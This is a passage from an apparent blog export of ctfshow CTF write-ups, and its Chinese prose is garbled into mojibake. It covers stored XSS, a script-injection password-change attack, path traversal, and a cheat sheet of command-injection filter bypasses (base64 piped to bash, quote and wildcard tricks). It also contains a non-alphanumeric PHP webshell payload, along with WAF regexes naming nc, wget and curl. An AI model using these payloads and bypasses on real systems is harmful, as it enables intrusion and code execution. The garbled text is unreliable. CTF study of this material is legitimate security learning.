<p>ï¼ˆäºŒï¼‰å­˜å‚¨å‹XSSæ”»å‡»è¿‡ç¨‹<br>è¿™ç§æ”»å‡»å¤šè§äºè®ºå›ã€åšå®¢å’Œç•™è¨€æ¿ã€‚æ”»å‡»è€…åœ¨å‘å¸–çš„è¿‡ç¨‹ä¸­ï¼Œå°†æ¶æ„è„šæœ¬è¿åŒæ­£å¸¸ä¿¡æ¯ä¸€èµ·æ³¨å…¥å¸–å­çš„å†…å®¹ä¸­ã€‚éšç€å¸–å­è¢«æœåŠ¡å™¨å­˜å‚¨ä¸‹æ¥ï¼Œæ¶æ„è„šæœ¬ä¹Ÿæ°¸ä¹…åœ°è¢«å­˜æ”¾åœ¨æœåŠ¡å™¨çš„åç«¯æ•°æ®åº“ä¸­ã€‚å½“å…¶ä»–ç”¨æˆ·æµè§ˆè¿™ä¸ªè¢«æ³¨å…¥äº†æ¶æ„è„šæœ¬çš„å¸–å­æ—¶ï¼Œæ¶æ„è„šæœ¬ä¼šåœ¨ä»–ä»¬çš„æµè§ˆå™¨ä¸­å¾—åˆ°è§¦å‘ã€‚<br>ä¾‹å¦‚ï¼Œæ”»å‡»è€…åœ¨ç•™è¨€æ¿ä¸­åŠ å…¥ä»¥ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å½“å…¶ä»–ç”¨æˆ·è®¿é—®ç•™è¨€æ¿æ—¶ï¼Œå°±ä¼šçœ‹åˆ°ä¸€ä¸ªå¼¹çª—ã€‚å¯ä»¥çœ‹åˆ°ï¼Œå­˜å‚¨å‹XSSçš„æ”»å‡»æ–¹å¼èƒ½å¤Ÿå°†æ¶æ„ä»£ç æ°¸ä¹…åœ°å­˜å…¥æ•°æ®åº“æˆ–è€…æ–‡ä»¶ä¸­ï¼Œç›¸å½“äºå°†ä»£ç åµŒå…¥ä¸€ä¸ªé¡µé¢ä¸­ï¼Œæ‰€æœ‰è®¿é—®è¿™ä¸ªé¡µé¢çš„ç”¨æˆ·éƒ½å°†æˆä¸ºå—å®³è€…ã€‚å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿè°¨æ…å¯¹å¾…ä¸æ˜é“¾æ¥ï¼Œé‚£ä¹ˆåå°„å‹XSSæ”»å‡»å°†æ²¡æœ‰å¤šå¤§ä½œä¸ºï¼Œè€Œå­˜å‚¨å‹XSSåˆ™ä¸åŒï¼Œç”±äºå®ƒæ³¨å…¥åœ¨ä¸€äº›æˆ‘ä»¬éå¸¸ä¿¡ä»»çš„é¡µé¢ä¸­ï¼Œå› æ­¤æ— è®ºæˆ‘ä»¬å¤šä¹ˆå°å¿ƒï¼Œéƒ½éš¾å…ä¼šå—åˆ°æ”»å‡»ã€‚</p>
<h2 id="web330"><a href="#web330" class="headerlink" title="web330"></a>web330</h2><p>å‘ç°ä¸€ä¸ªä¿®æ”¹å¯†ç çš„ç•Œé¢</p>
<p>è‡ªå·±éšä¾¿æ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œä¿®æ”¹å¯†ç ï¼ŒæŠ“åŒ…çœ‹è§</p>
<p>GET &#x2F;api&#x2F;change.php?p&#x3D;qwe HTTP&#x2F;1.1</p>
<p>ç”¨ä¸‹é¢è¿™å¥è¯ä½œä¸ºè´¦å·å¯†ç æ³¨å†Œä¸€ä¸ªè´¦å·</p>
<script>window.open('http://127.0.0.1/api/change.php?p=123')</script>

<p>admin 123ç™»å½•æ‰“å¼€æŠ“åŒ…çœ‹responseç”¨æˆ·ç®¡ç†å³å¯å‘ç°flagï¼Œè¦ç”¨æŠ“åŒ…ï¼Œä¸ç„¶ä¼šé‡å®šå‘ï¼Œçœ‹ä¸åˆ°è¿™ä¸ªã€‚å¯ä»¥ä»responseä¸­çœ‹åˆ°flag</p>
<h2 id="web331"><a href="#web331" class="headerlink" title="web331"></a>web331</h2><h2 id="web332"><a href="#web332" class="headerlink" title="web332"></a>web332</h2><p>é€»è¾‘æ¼æ´è½¬è´¦è´Ÿæ•°é‡‘é¢å³å¯-100000è¦æ˜¯æ”¯ä»˜å®æœ‰è¿™ä¸ªæ¼æ´å°±å¥½äº†</p>
<p>è´­ä¹°flag</p>
<h2 id="web333"><a href="#web333" class="headerlink" title="web333"></a>web333</h2><p>ä¸èƒ½è½¬è´Ÿæ•°äº†ä½†æ˜¯å¯ä»¥ç»™è‡ªå·±è½¬ï¼Œbpçˆ†ç ´ä¸€ä¸‹å§ï¼Œpayload set 1;</p>
<p>payloadtype number;</p>
<p>from 4  to 1000;</p>
<p>åˆ·æ–°çœ‹åˆ°æœ‰é’±ä¹°flag</p>
]]></content>
      <categories>
        <category>ctfshow</category>
      </categories>
      <tags>
        <tag>ctfshow</tag>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>ä¸­æœŸæµ‹è¯„</title>
    <url>/2023/04/29/ctfshow%E5%90%88%E9%9B%86-%E4%B8%AD%E6%9C%9F%E6%B5%8B%E8%AF%84/</url>
    <content><![CDATA[<p> ä¸­æœŸæµ‹è¯„</p>
  <span id="more"></span>

<h2 id="web486"><a href="#web486" class="headerlink" title="web486"></a>web486</h2><p>æ–‡ä»¶åŒ…å«ï¼Œç›®å½•ç©¿è¶Šæ¼æ´</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://5a6eadf3-e230-45ef-84bf-d4049f8efdff.challenge.ctf.show/index.php?action=../flag</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹æºç </p>
<h2 id="web487"><a href="#web487" class="headerlink" title="web487"></a>web487</h2>]]></content>
      <tags>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>å‘½ä»¤æ‰§è¡ŒæŠ€å·§</title>
    <url>/2023/01/09/ctfshow%E5%90%88%E9%9B%86-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%8A%80%E5%B7%A7/</url>
    <content><![CDATA[<p>phpçš„includeå¯ä»¥è½½å…¥ä¸€ä¸ªå¤–éƒ¨phpæ–‡ä»¶ï¼Œå…¶å‚æ•°æ˜¯ä¸€ä¸ªæ–‡ä»¶åï¼Œæ—¢ç„¶æ˜¯æ–‡ä»¶åï¼Œå°±ä¸èƒ½å¸¦å‚æ•°äº†ã€‚</p>
<p>phpä¸­ï¼Œå¦‚æœincludeè½½å…¥çš„æ–‡ä»¶ä¸€å®šè¦å¸¦å‚æ•°ï¼Œå°±åªæœ‰ä¸€ç§åŠæ³•ï¼Œå³è¿™ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªå…¨è·¯å¾„çš„URLåœ°å€ã€‚</p>
<span id="more"></span>

<p>windows ä¸‹</p>
<blockquote>
<p><code>|</code>ç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥<br><code>||</code>å¦‚æœå‰é¢å‘½ä»¤æ˜¯é”™çš„é‚£ä¹ˆå°±æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå¦åˆ™åªæ‰§è¡Œå‰é¢çš„è¯­å¥<br><code>&amp;</code>å‰é¢å’Œåé¢å‘½ä»¤éƒ½è¦æ‰§è¡Œï¼Œæ— è®ºå‰é¢çœŸå‡<br><code>&amp;&amp;</code>å¦‚æœå‰é¢ä¸ºå‡ï¼Œåé¢çš„å‘½ä»¤ä¹Ÿä¸æ‰§è¡Œï¼Œå¦‚æœå‰é¢ä¸ºçœŸåˆ™æ‰§è¡Œä¸¤æ¡å‘½ä»¤</p>
</blockquote>
<p>Linux ä¸‹</p>
<blockquote>
<p><code>;</code>å‰é¢å’Œåé¢å‘½ä»¤éƒ½è¦æ‰§è¡Œï¼Œæ— è®ºå‰é¢çœŸå‡<br><code>|</code>ç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥<br><code>||</code>å¦‚æœå‰é¢å‘½ä»¤æ˜¯é”™çš„é‚£ä¹ˆå°±æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå¦åˆ™åªæ‰§è¡Œå‰é¢çš„è¯­å¥<br><code>&amp;</code>å‰é¢å’Œåé¢å‘½ä»¤éƒ½è¦æ‰§è¡Œï¼Œæ— è®ºå‰é¢çœŸå‡<br><code>&amp;&amp;</code>å¦‚æœå‰é¢ä¸ºå‡ï¼Œåé¢çš„å‘½ä»¤ä¹Ÿä¸æ‰§è¡Œï¼Œå¦‚æœå‰é¢ä¸ºçœŸåˆ™æ‰§è¡Œä¸¤æ¡å‘½ä»¤</p>
<h1 id="ç©ºæ ¼ç»•è¿‡"><a href="#ç©ºæ ¼ç»•è¿‡" class="headerlink" title="ç©ºæ ¼ç»•è¿‡"></a>ç©ºæ ¼ç»•è¿‡</h1><blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;` `&lt;` `&lt;&gt;` é‡å®šå‘ç¬¦</span><br><span class="line">`%09`(éœ€è¦phpç¯å¢ƒ)</span><br><span class="line">`$&#123;IFS&#125;`</span><br><span class="line">`$IFS$9` //$1æ”¹æˆ$åŠ å…¶ä»–æ•°å­—è²Œä¼¼éƒ½è¡Œ</span><br><span class="line">`&#123;cat,flag.php&#125;` //ç”¨é€—å·å®ç°äº†ç©ºæ ¼åŠŸèƒ½</span><br><span class="line">`%20`</span><br><span class="line">`%09</span><br></pre></td></tr></table></figure>
</blockquote>
</blockquote>
<p>æ‰§è¡Œä»£ç å‡½æ•°</p>
<p><code>eval()</code><br><code>assert()</code><br><code>preg_replace()</code><br><code>create_function()</code><br><code>array_map()</code><br><code>call_user_func()</code><br><code>call_user_func_array()</code><br><code>array_filter</code><br><code>usort</code><br><code>uasort()</code></p>
<p>${}:ä¸­é—´çš„phpä»£ç å°†ä¼šè¢«è§£æ</p>
<p>å‘½ä»¤æ‰§è¡Œå‡½æ•°</p>
<p>system()<br>exec()<br>shell_exec()<br>passthru()<br>pcntl_exec()<br>popen()<br>proc_open()</p>
<p>PHP æ”¯æŒä¸€ä¸ªæ‰§è¡Œè¿ç®—ç¬¦ï¼šåå¼•å·ï¼ˆ&#96;ï¼‰ã€‚æ³¨æ„è¿™ä¸æ˜¯å•å¼•å·ï¼PHP    å°†å°è¯•å°†åå¼•å·ä¸­çš„å†…å®¹ä½œä¸º shell å‘½ä»¤æ¥æ‰§è¡Œï¼Œå¹¶å°†å…¶è¾“å‡ºä¿¡æ¯è¿”å›ï¼ˆå³ï¼Œå¯ä»¥èµ‹ç»™ä¸€ä¸ªå˜é‡è€Œä¸æ˜¯ç®€å•åœ°ä¸¢å¼ƒåˆ°æ ‡å‡†è¾“å‡ºï¼‰ã€‚ä½¿ç”¨åå¼•å·è¿ç®—ç¬¦â€œâ€çš„æ•ˆæœä¸å‡½æ•°    shell_exec() ç›¸åŒã€‚</p>
<ul>
<li><p>æ–‡ä»¶åŒ…å«å‡½æ•°ï¼š</p>
<p>require<br>include<br>require_ once<br>include once</p>
<p>æ–‡ä»¶è¯»å–å‡½æ•°ï¼š</p>
<p>copy<br>file_get_contents()<br>highlight_file()<br>fopen()<br>read file()<br>fread()<br>fgetss()<br>fgets()<br>parse_ini_file()<br>show_source()<br>file()</p>
</li>
</ul>
<h1 id="catè¢«è¿‡æ»¤"><a href="#catè¢«è¿‡æ»¤" class="headerlink" title="catè¢«è¿‡æ»¤"></a>catè¢«è¿‡æ»¤</h1><blockquote>
<p>more:ä¸€é¡µä¸€é¡µçš„æ˜¾ç¤ºæ¡£æ¡ˆå†…å®¹<br>less:ä¸ more ç±»ä¼¼<br>head:æŸ¥çœ‹å¤´å‡ è¡Œ<br>tac:ä»æœ€åä¸€è¡Œå¼€å§‹æ˜¾ç¤ºï¼Œå¯ä»¥çœ‹å‡º tac æ˜¯ cat çš„åå‘æ˜¾ç¤º<br>tail:æŸ¥çœ‹å°¾å‡ è¡Œ<br>nlï¼šæ˜¾ç¤ºçš„æ—¶å€™ï¼Œé¡ºä¾¿è¾“å‡ºè¡Œå·<br>od:ä»¥äºŒè¿›åˆ¶çš„æ–¹å¼è¯»å–æ¡£æ¡ˆå†…å®¹<br>vi:ä¸€ç§ç¼–è¾‘å™¨ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥æŸ¥çœ‹<br>vim:ä¸€ç§ç¼–è¾‘å™¨ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥æŸ¥çœ‹<br>sort:å¯ä»¥æŸ¥çœ‹<br>uniq:   &#x2F;&#x2F; uniq å‘½ä»¤ç”¨äºæ£€æŸ¥åŠåˆ é™¤æ–‡æœ¬æ–‡ä»¶ä¸­é‡å¤å‡ºç°çš„è¡Œåˆ—<br>file -f:æŠ¥é”™å‡ºå…·ä½“å†…å®¹</p>
<h1 id="é»‘åå•ç»•è¿‡"><a href="#é»‘åå•ç»•è¿‡" class="headerlink" title="é»‘åå•ç»•è¿‡"></a>é»‘åå•ç»•è¿‡</h1><p>æ‹¼æ¥</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=c;b=at;c=fl;d=ag;$a$b $c$d</span><br></pre></td></tr></table></figure>
</blockquote>
<p>base64ç¼–ç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;Y2F0IGZsYWc=&quot;|base64 -d|bash //cat flag</span><br><span class="line">echo &quot;Y2F0IC9mbGFn&quot;|base64 -d|bash   //cat /flag</span><br></pre></td></tr></table></figure>

<p>æƒ…å†µä¸‹å¯å°è¯•sh)</p>
<p>å•å¼•å·ã€åŒå¼•å·</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c&quot;&quot;at fl&#x27;&#x27;ag</span><br></pre></td></tr></table></figure>
</blockquote>
<p>åæ–œçº¿</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c\at fl\ag</span><br></pre></td></tr></table></figure>
</blockquote>
<p>æ­£åˆ™ (å‡è®¾&#x2F;bin&#x2F;cat: test: æ˜¯ä¸€ä¸ªç›®å½•)</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/???/?[a][t] ?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;`</span><br><span class="line">`/???/?at ????`</span><br><span class="line">`/???/?[a]&#x27;&#x27;[t] ?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;</span><br></pre></td></tr></table></figure>
</blockquote>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat `ls` #æŸ¥çœ‹å½“å‰ç›®å½•çš„æ‰€æœ‰æ–‡ä»¶çš„å†…å®¹ã€‚</span><br><span class="line"></span><br><span class="line">cat *     #æŸ¥çœ‹å½“å‰ç›®å½•çš„æ‰€æœ‰æ–‡ä»¶çš„å†…å®¹ã€‚</span><br></pre></td></tr></table></figure>

<p><strong>â€œ.&#x2F;â€œï¼šä»£è¡¨ç›®å‰æ‰€åœ¨çš„ç›®å½•ã€‚</strong></p>
<p><strong>â€œ . .&#x2F;â€œä»£è¡¨ä¸Šä¸€å±‚ç›®å½•ã€‚</strong></p>
<p><strong>â€œ&#x2F;â€œï¼šä»£è¡¨æ ¹ç›®å½•ã€‚</strong></p>
<p>web135æ— å›æ˜¾ï¼Œå‘½ä»¤é•¿åº¦é™åˆ¶</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?F=`$F` ;ls;  //ç›¸å½“äºæ‰§è¡Œ</span><br><span class="line">eval(`$F` ;);</span><br><span class="line">``$F` ;ls;`</span><br></pre></td></tr></table></figure>

<p>å¦è§£cpå‘½ä»¤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?F=`$F` ;cp flag.php 666.txt</span><br><span class="line">?F=`$F` ;nl flag.php&gt;666.txt</span><br><span class="line">?F=`$F` ;mv flag.php 666.txt</span><br></pre></td></tr></table></figure>

<p> mv source_file(æ–‡ä»¶) dest_file(æ–‡ä»¶)</p>
<p>å°†æºæ–‡ä»¶å source_file æ”¹ä¸ºç›®æ ‡æ–‡ä»¶å dest_file</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>æ²¡æœ‰å›æ˜¾</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls /|tee 1</span><br><span class="line">?c=nl /f149_15_h3r3|tee 1</span><br><span class="line">?c=awk &#x27;/f/&#x27; /f149_15_h3r3|tee 1 // awk -f [file] è°ƒç”¨è„šæœ¬</span><br></pre></td></tr></table></figure>

<p>awk å‘½ä»¤ä¹Ÿæ˜¯é€è¡Œæ‰«ææ–‡ä»¶ï¼ˆä»ç¬¬ 1 è¡Œåˆ°æœ€åä¸€è¡Œï¼‰ï¼Œå¯»æ‰¾å«æœ‰ç›®æ ‡æ–‡æœ¬çš„è¡Œï¼Œå¦‚æœåŒ¹é…æˆåŠŸï¼Œåˆ™ä¼šåœ¨è¯¥è¡Œä¸Šæ‰§è¡Œç”¨æˆ·æƒ³è¦çš„æ“ä½œï¼›åä¹‹ï¼Œåˆ™ä¸å¯¹è¡Œåšä»»ä½•å¤„ç†</p>
<p>ä»è„šæœ¬æ–‡ä»¶ä¸­è¯»å– awk è„šæœ¬æŒ‡ä»¤ï¼Œä»¥å–ä»£ç›´æ¥åœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥æŒ‡ä»¤</p>
<p>Linux teeå‘½ä»¤ç”¨äºè¯»å–æ ‡å‡†è¾“å…¥çš„æ•°æ®ï¼Œå¹¶å°†å…¶å†…å®¹è¾“å‡ºæˆæ–‡ä»¶</p>
]]></content>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>æ¯å‘¨å¤§æŒ‘æˆ˜</title>
    <url>/2023/05/23/ctfshow%E5%90%88%E9%9B%86-%E6%AF%8F%E5%91%A8%E5%A4%A7%E6%8C%91%E6%88%98/</url>
    <content><![CDATA[<p>ctfshow rceæé™æŒ‘æˆ˜</p>
<p>ä¸èƒ½ç”¨å­—æ¯æ•°å­—æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡<strong>å¼‚æˆ–ï¼Œå–åï¼Œè‡ªå¢è‡ªå‡ï¼Œæˆ–</strong>ç­‰ä½è¿ç®—åˆ©ç”¨ç‰¹æ®Šå­—ç¬¦æ„é€ å‡ºå­—æ¯æ•°å­—ï¼Œå†åˆ©ç”¨<strong>phpåŠ¨æ€å‡½æ•°å</strong>çš„ç‰¹æ€§æ¥æ„é€ webshellã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = &#x27;&#x27;.[];</span><br><span class="line">echo($a);//ç»“æœå°±ä¸ºarray</span><br><span class="line">$_=[].[]; //ä¿©æ•°ç»„æ‹¼æ¥å¼ºè¡Œè¿”å›ArrayArray,è¿™é‡Œä¸€ä¸ªçŸ­æ çš„å€¼ä¹Ÿå°±æ˜¯ArrayArray</span><br><span class="line">PHPåœ¨è¿›è¡Œè®¡ç®—çš„æ—¶å€™è®¤ä¸ºç»“æœæ˜¯æ— é™å¤§æ—¶ä»–ä¼šè¿”å›ç»“æœæ˜¯:INF ï¼ˆ Infinite)</span><br><span class="line">è¿™é‡Œä¸¾ä¸ªåˆ—ï¼šecho (1/0);  //å°±ä¼šè¾“å‡ºINF</span><br><span class="line">PHPè¿›è¡Œè®¡ç®—çš„æ—¶å€™è®¤ä¸ºä¸€ä¸ªæ•°è¶…å‡ºInfiniteï¼Œé‚£å°±æ˜¯: NAN( not-a-number)</span><br><span class="line">è¿™é‡Œä¸¾ä¸ªä¾‹ï¼šecho (a/a); //å°±ä¼šè¾“å‡ºNAN</span><br></pre></td></tr></table></figure>

<h2 id="rce1"><a href="#rce1" class="headerlink" title="rce1"></a>rce1</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="variable">$code</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;(&quot;</span>,<span class="string">&quot;æ‹¬å·&quot;</span>,<span class="variable">$code</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;ç‚¹&quot;</span>,<span class="variable">$code</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>payloadï¼šecho <code>cat /f*</code>;</p>
<h2 id="rce2"><a href="#rce2" class="headerlink" title="rce2"></a>rce2</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>fuzzä¸€ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">for($a = 0; $a &lt; 256; $a++)&#123;</span><br><span class="line">    if (!preg_match(&quot;/[a-zA-Z0-9@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;,chr($a)))&#123;</span><br><span class="line">        echo urlencode(chr($a)).&quot; &quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">//! $ &#x27; ( ) + , . / ; = [ ] _</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_=[].[]; //ä¿©æ•°ç»„æ‹¼æ¥å¼ºè¡Œè¿”å›ArrayArray,è¿™é‡Œä¸€ä¸ªçŸ­æ çš„å€¼ä¹Ÿå°±æ˜¯ArrayArray</span><br><span class="line">$__=&#x27;&#x27;;  //ä¸¤ä¸ªçŸ­æ èµ‹å€¼ä¸ºç©º</span><br><span class="line">$_=$_[&#x27;&#x27;];//ä»arrayarrayä¸­å–é¦–å­—ç¬¦ï¼Œå³aã€‚è¿™é‡Œ$_=$_[0]ä¹Ÿæ˜¯ä¸€æ ·çš„é“ç†ï¼Œä¸è¿‡wafé™åˆ¶æ•°å­—è¾“å…¥</span><br><span class="line">$_=++$_; //B</span><br><span class="line">$_=++$_; //C</span><br><span class="line">$_=++$_; //D</span><br><span class="line">$_=++$_; //D</span><br><span class="line">$__.=$_; //E  æŠŠä¸¤ä¸ªçŸ­æ èµ‹å€¼ä¸ºE</span><br><span class="line">$_=++$_; //F  ä¸€ä¸ªçŸ­æ ç»§ç»­è‡ªå¢</span><br><span class="line">$_=++$_; //G </span><br><span class="line">$__=$_.$__; // GE  ä¸€ä¸ªçŸ­æ è‡ªå¢å˜æˆäº†Gï¼Œä¸¤ä¸ªçŸ­æ åœ¨å‰é¢ç¬¬åä¸€è¡Œå¤„å·²ç»èµ‹å€¼ä¸ºEï¼Œæ‹¼æ¥å¾—GE</span><br><span class="line">$_=++$_; //H æ­¤å¤„ä¸€ä¸ªçŸ­æ ç»§ç»­è‡ªå¢ï¼Œä¸ºH</span><br><span class="line">$_=++$_; //I</span><br><span class="line">$_=++$_; //J</span><br><span class="line">$_=++$_; //k</span><br><span class="line">$_=++$_; //L</span><br><span class="line">$_=++$_; //M</span><br><span class="line">$_=++$_; //N</span><br><span class="line">$_=++$_; //O</span><br><span class="line">$_=++$_; //P</span><br><span class="line">$_=++$_; //Q</span><br><span class="line">$_=++$_; //R</span><br><span class="line">$_=++$_; //S</span><br><span class="line">$_=++$_; //T</span><br><span class="line">$__.=$_; // GET åœ¨æ­¤å¤„ï¼Œä¸¤æ¡çŸ­æ åŸæ˜¯GEä¸ä¸€æ¡çŸ­æ ï¼ˆå·²ç»è‡ªå¢ä¸ºTï¼‰ï¼Œ.=æ‹¼æ¥ï¼Œæ„æˆget</span><br><span class="line">$&#123;&#x27;_&#x27;.$__&#125;[_]($&#123;&#x27;_&#x27;.$__&#125;[__]); // è¿›è¡Œæ‹¼æ¥ï¼Œ$_GET[&#x27;_&#x27;]($_GET[&#x27;__&#x27;]);</span><br></pre></td></tr></table></figure>

<p>æ ¹æ®è¿™ä¸ªå†™çš„payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//è¿™æ˜¯æˆ‘è¿™ä¸€é¢˜åšå‡ºæ¥çš„æ‰€ç”¨çš„</span><br><span class="line">$_=[].[];$__=&#x27;&#x27;;$_=$_[&#x27;&#x27;];$_=++$_;$_=++$_;$_=++$_;$_=++$_;$__.=$_;$_=++$_;$_=++$_;$__=$_.$__;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$__.=$_;$___=&#x27;_&#x27;;$___.=$__;($$___[_])($$___[__]);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">ctf_show=%24_%3D%5B%5D.%5B%5D%3B%24__%3D%27%27%3B%24_%3D%24_%5B%27%27%5D%3B%24_%3D%2B%2B%24_%3B%24_%3D%2B%2B%24_%3B%24_%3D%2B%2B%24_%3B%24_%3D%2B%2B%24_%3B%24__.%3D%24_%3B%24_%3D%2B%2B%24_%3B%24_%3D%2B%2B%24_%3B%24__%3D%24_.%24__%3B%24_%3D%2B%2B%24_%3B%24_%3D%2B%2B%24_%3B%24_%3D%2B%2B%24_%3B%24_%3D%2B%2B%24_%3B%24_%3D%2B%2B%24_%3B%24_%3D%2B%2B%24_%3B%24_%3D%2B%2B%24_%3B%24_%3D%2B%2B%24_%3B%24_%3D%2B%2B%24_%3B%24_%3D%2B%2B%24_%3B%24_%3D%2B%2B%24_%3B%24_%3D%2B%2B%24_%3B%24_%3D%2B%2B%24_%3B%24__.%3D%24_%3B%24___%3D%27_%27%3B%24___.%3D%24__%3B%28%24%24___%5B_%5D%29%28%24%24___%5B__%5D%29%3B</span><br><span class="line">//ç„¶ågetä¼ _=system&amp;__=ls</span><br><span class="line">//urlç¼–ç åç”¨æŠ“åŒ…ä¼ å‚ï¼Œ</span><br></pre></td></tr></table></figure>

<p>ctfshow{6a98d4af-f123-458a-9ad8-4fbbbb75cdd6}</p>
<h2 id="rce3"><a href="#rce3" class="headerlink" title="rce3"></a>rce3</h2><p>PHPè¿›è¡Œè®¡ç®—çš„æ—¶å€™è®¤ä¸ºä¸€ä¸ªæ•°è¶…å‡ºInfiniteï¼Œé‚£å°±æ˜¯: NAN( not-a-number)<br> è¿™é‡Œä¸¾ä¸ªä¾‹ï¼šecho (a&#x2F;a); &#x2F;&#x2F;å°±ä¼šè¾“å‡ºNAN</p>
